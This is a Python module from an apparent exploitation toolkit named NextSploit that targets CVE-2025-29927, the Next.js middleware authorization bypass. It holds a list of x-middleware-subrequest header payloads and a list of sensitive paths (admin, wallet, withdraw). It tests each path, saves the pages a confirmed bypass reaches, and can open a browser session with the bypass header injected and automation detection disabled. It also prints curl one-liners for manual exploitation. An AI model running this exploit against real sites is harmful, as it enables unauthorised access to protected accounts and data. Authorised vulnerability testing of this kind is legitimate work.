#!/usr/bin/env python3
"""
NextSploit — CVE-2025-29927: Middleware Authorization Bypass
Merged from: MiddlewareBypass.py + exploit_middleware_bypass.py

Next.js middleware can be bypassed via the x-middleware-subrequest header,
allowing unauthenticated access to protected routes.
Affected: Next.js < 14.2.25
"""

import requests
import os

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, log_status, print_module_header, print_finding,
    create_progress,
)

CVE_ID = "CVE-2025-29927"
CVE_INFO = CVE_DATABASE[CVE_ID]

# ─── Browser Exploit (ported from AnonKryptiQuz/NextSploit) ──────────────────

def open_bypassed_page(url: str, middleware_value: str) -> None:
    """
    Open a browser session with the x-middleware-subrequest bypass header
    pre-configured. Ported from the original NextSploit by AnonKryptiQuz.

    Source: https://github.com/AnonKryptiQuz/NextSploit
    Author: AnonKryptiQuz (https://AnonKryptiQuz.github.io/)
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options
    except ImportError:
        log_error("Selenium not installed. Run: pip install selenium")
        log_info("Skipping browser exploit — manual curl command:")
        log_info(f'  curl -H "x-middleware-subrequest: {middleware_value}" {url}')
        return

    log_info(f"[AnonKryptiQuz] Launching browser with bypass header: x-middleware-subrequest: {middleware_value}")

    chromedriver_path = "chromedriver.exe" if os.name == "nt" else "/usr/bin/chromedriver"

    chrome_options = Options()
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-background-networking")
    chrome_options.add_argument("--disable-default-apps")
    chrome_options.add_argument("--disable-sync")
    chrome_options.add_argument("--disable-translate")
    chrome_options.add_argument("--disable-popup-blocking")

    try:
        service = Service(chromedriver_path)
        driver = webdriver.Chrome(service=service, options=chrome_options)

        driver.execute_cdp_cmd("Network.enable", {})
        driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {
            "headers": {
                "x-middleware-subrequest": middleware_value
            }
        })

        driver.get(url)
        log_success("Browser opened. Review the page, then press Enter to close.")
        input("  [Press Enter to close browser and continue]")
        driver.quit()

    except Exception as e:
        log_error(f"Browser exploit failed: {e}")
        log_info(f'Manual command: curl -H "x-middleware-subrequest: {middleware_value}" {url}')


# ─── Payloads ────────────────────────────────────────────────────────────────

# All x-middleware-subrequest header variants (deduplicated from both scripts)
MIDDLEWARE_VARIANTS = [
    "middleware",
    "src/middleware",
    "pages/_middleware",
    "middleware.js",
    "middleware.ts",
    "src/middleware.js",
    "src/middleware.ts",
    "pages/_middleware.js",
    "pages/_middleware.ts",
    "middleware:/middleware",
    "middleware:src/middleware",
]

# Protected paths to test (deduplicated & merged)
PROTECTED_PATHS = [
    "/dashboard", "/account", "/admin", "/settings", "/profile",
    "/wallet", "/api/user", "/api/admin", "/mining", "/referral",
    "/withdraw", "/deposit", "/user", "/users", "/me", "/private",
    "/api/v1", "/api/v2", "/api/", "/graphql", "/api/graphql",
    "/secret", "/internal", "/v1", "/v2",
]


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2025-29927 — Middleware Auth Bypass.
    
    Tests each protected path with each middleware header variant,
    comparing baseline (normal) vs bypass response.
    """
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")

    log_info(f"Testing {len(PROTECTED_PATHS)} paths × {len(MIDDLEWARE_VARIANTS)} header variants")
    log_info(f"Fix version: {CVE_INFO['fix_version']}")

    total_tests = len(PROTECTED_PATHS) * len(MIDDLEWARE_VARIANTS)

    with create_progress() as progress:
        task = progress.add_task("Middleware Bypass Scan", total=total_tests)

        for path in PROTECTED_PATHS:
            url = f"{target}{path}"

            # ── Baseline request (no bypass header) ──────────────────────
            try:
                r_normal = session.get(url, timeout=config.timeout, allow_redirects=False)
                baseline_status = r_normal.status_code
                baseline_len = len(r_normal.text)
                log_debug(f"Baseline [{baseline_status}] {path} ({baseline_len} bytes)")
            except requests.RequestException as e:
                log_debug(f"Baseline failed for {path}: {e}")
                progress.update(task, advance=len(MIDDLEWARE_VARIANTS))
                continue

            # ── Test each middleware variant ──────────────────────────────
            for variant in MIDDLEWARE_VARIANTS:
                progress.update(task, advance=1)

                try:
                    bypass_headers = {"x-middleware-subrequest": variant}
                    r_bypass = session.get(
                        url,
                        headers=bypass_headers,
                        timeout=config.timeout,
                        allow_redirects=False,
                    )

                    bypass_status = r_bypass.status_code
                    bypass_len = len(r_bypass.text)

                    log_trace(f"[{bypass_status}] {path} | variant={variant}")

                    # ── Detect differences ───────────────────────────────
                    baseline_is_protected = False
                    if baseline_status in (401, 403):
                        baseline_is_protected = True
                    elif baseline_status in (301, 302, 307, 308):
                        loc = r_normal.headers.get("Location", "").lower()
                        if any(x in loc for x in ["login", "signin", "sign-in", "auth"]):
                            baseline_is_protected = True
                    elif baseline_status == 200:
                        txt = r_normal.text[:500].lower()
                        if any(x in txt for x in ["login", "sign in", "sign-in", "unauthorized"]):
                            baseline_is_protected = True

                    status_diff = bypass_status != baseline_status
                    size_diff = abs(bypass_len - baseline_len) > 100

                    if baseline_is_protected and (status_diff or size_diff):
                        # Possible bypass detected
                        is_real_bypass = (
                            bypass_status == 200
                            and "login" not in r_bypass.text[:500].lower()
                            and "sign in" not in r_bypass.text[:500].lower()
                            and "sign-in" not in r_bypass.text[:500].lower()
                        )

                        evidence = {
                            "path": path,
                            "header_variant": variant,
                            "normal_status": baseline_status,
                            "bypass_status": bypass_status,
                            "normal_size": f"{baseline_len} bytes",
                            "bypass_size": f"{bypass_len} bytes",
                        }

                        if is_real_bypass:
                            severity = "CRITICAL"
                            detail = (
                                f"Middleware bypass via x-middleware-subrequest: {variant} "
                                f"on {path} — Got 200 with content (no login redirect)"
                            )
                            log_critical(f"BYPASS CONFIRMED on {path}")
                            print_finding(CVE_ID, detail, evidence)

                            # Save response
                            try:
                                fname = f"reports/bypass_{path.replace('/', '_')}.html"
                                import os
                                os.makedirs("reports", exist_ok=True)
                                with open(fname, "w", errors="ignore") as f:
                                    f.write(r_bypass.text)
                                log_success(f"Response saved to {fname}")
                                evidence["saved_to"] = fname
                            except Exception:
                                pass
                        else:
                            severity = "HIGH"
                            detail = (
                                f"Response difference detected on {path} with variant '{variant}' "
                                f"(status: {baseline_status}→{bypass_status}, "
                                f"size: {baseline_len}→{bypass_len})"
                            )
                            log_warning(f"Difference on {path} | {variant}")
                            print_finding(CVE_ID, detail, evidence)

                        finding = Finding(
                            cve=CVE_ID,
                            severity=severity,
                            title=CVE_INFO["title"],
                            status="VULNERABLE",
                            detail=detail,
                            evidence=evidence,
                        )
                        result.add_finding(finding)

                except requests.RequestException as e:
                    log_trace(f"Error {path}|{variant}: {e}")

    # ── Final status ─────────────────────────────────────────────────────
    if result.finding_count > 0:
        critical_count = sum(1 for f in result.findings if f.severity == "CRITICAL")
        log_critical(
            f"Found {result.finding_count} anomalies "
            f"({critical_count} critical)"
        )

        # ── Browser exploit chaining (AnonKryptiQuz integration) ─────────
        if config.browser_exploit and critical_count > 0:
            # Determine middleware value from the first CRITICAL finding
            critical_findings = [f for f in result.findings if f.severity == "CRITICAL"]
            if critical_findings:
                first = critical_findings[0]
                middleware_value = first.evidence.get("header_variant", "middleware")
                bypass_path = first.evidence.get("path", "/")
                exploit_url = f"{config.target.rstrip('/')}{bypass_path}"

                log_info(
                    "[AnonKryptiQuz] Browser exploit chain triggered — "
                    f"opening {exploit_url} with bypass header"
                )
                open_bypassed_page(exploit_url, middleware_value)
    else:
        log_success("No middleware bypass detected")

    return result
